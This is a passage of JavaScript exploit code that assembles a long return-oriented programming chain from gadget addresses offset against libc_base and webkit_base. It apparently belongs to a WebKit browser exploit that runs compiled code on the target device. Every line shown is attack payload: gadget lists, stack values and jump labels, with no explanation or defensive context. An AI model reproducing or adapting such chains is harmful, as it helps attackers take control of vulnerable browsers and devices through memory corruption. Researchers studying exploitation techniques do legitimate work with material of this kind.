libc_base+467092, //pop rax
//L1565:
libc_base+766440, //pop rsp
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+125184, //L1568-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1566:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+125288, //L1571-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+125272, //L1570-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1570:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1571:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+125432, //L1574-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+125400, //L1572-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+125416, //L1573-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1572:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1573:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1574:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+125504, //L1575-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1575:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+125560, //L1578-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1578:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+125640, //L1579-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1579:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1580:
db([35, 0]); // 0x23
set_gadget(libc_base+757614,); //pop rcx
//L1581:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+125744, //L1582-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+125760, //L1583-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1582:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1583:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+125848, //L1584-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1584:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+125904, //L1587-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1587:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+125976, //L1588-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1588:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+126032, //L1591-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1591:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+126136, //L1594-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1592:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L1594:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+126240, //L1597-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+126224, //L1596-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1596:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1597:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+126384, //L1600-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+126352, //L1598-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+126368, //L1599-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1598:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1599:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1600:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+126480, //L1603-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1601:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+126584, //L1606-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+126568, //L1605-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1605:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1606:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+126728, //L1609-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+126696, //L1607-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+126712, //L1608-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1607:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1608:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1609:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+126800, //L1610-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1610:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+126856, //L1613-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1613:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+126936, //L1614-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1614:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1615:
db([36, 0]); // 0x24
set_gadget(libc_base+757614,); //pop rcx
//L1616:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+127040, //L1617-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+127056, //L1618-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1617:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1618:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+127144, //L1619-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1619:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+127200, //L1622-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1622:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+127272, //L1623-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1623:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+127328, //L1626-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1626:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1627:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+127480, //L1630-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1628:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1630:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+127584, //L1633-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+127568, //L1632-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1632:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1633:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+127728, //L1636-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+127696, //L1634-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+127712, //L1635-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1634:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1635:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1636:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+127800, //L1637-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1637:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+127856, //L1640-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1640:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+127936, //L1641-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1641:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1642:
db([37, 0]); // 0x25
set_gadget(libc_base+757614,); //pop rcx
//L1643:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+128040, //L1644-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+128056, //L1645-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1644:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1645:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+128144, //L1646-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1646:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+128200, //L1649-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1649:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+128272, //L1650-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1650:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+128328, //L1653-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1653:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1654:
libc_base+753609, //mov rsp, rbp ; pop rbp
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+128480, //L1657-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1655:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1657:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+128584, //L1660-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+128568, //L1659-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1659:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1660:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+128728, //L1663-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+128696, //L1661-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+128712, //L1662-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1661:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1662:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1663:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+128800, //L1664-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+128856, //L1667-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1667:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+128936, //L1668-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1668:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1669:
db([38, 0]); // 0x26
set_gadget(libc_base+757614,); //pop rcx
//L1670:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+129040, //L1671-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+129056, //L1672-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1671:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+129144, //L1673-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1673:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+129200, //L1676-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1676:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+129272, //L1677-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1677:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+129328, //L1680-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1680:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+129456, //L1682-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+129440, //L1681-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1681:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1682:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+129552, //L1683-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+129568, //L1684-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L1683:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1684:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+129680, //L1685-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+129664, //L1686-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L1686:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L1685:
db([0, 0]); // 0x0
//___sputc:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+129752, //L1687-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L1687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+129840, //L1689-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+129856, //L1690-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1689:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L1690:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1691:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1692:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+129984, //L1694-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+129968, //L1693-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1693:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1694:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+130080, //L1697-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1695:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L1697:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+130184, //L1700-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+130168, //L1699-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1699:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1700:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+130304, //L1702-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+130336, //L1704-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+130320, //L1703-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L1701:
db([12, 0]); // 0xc
set_gadget(libc_base+757614,); //pop rcx
//L1702:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1703:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+130440, //L1707-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+130424, //L1706-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1706:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1707:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+130608, //L1710-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+130624, //L1711-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+130576, //L1708-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+130592, //L1709-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1708:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1709:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1710:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1711:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+130736, //L1714-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+130720, //L1713-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L1712:
db([4294967295, 4294967295]); // -0x1
set_gadget(libc_base+155394,); //pop rdi
//L1713:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+130840, //L1717-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1715:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L1717:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+130944, //L1720-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+130928, //L1719-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1719:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1720:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+131032, //L1722-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
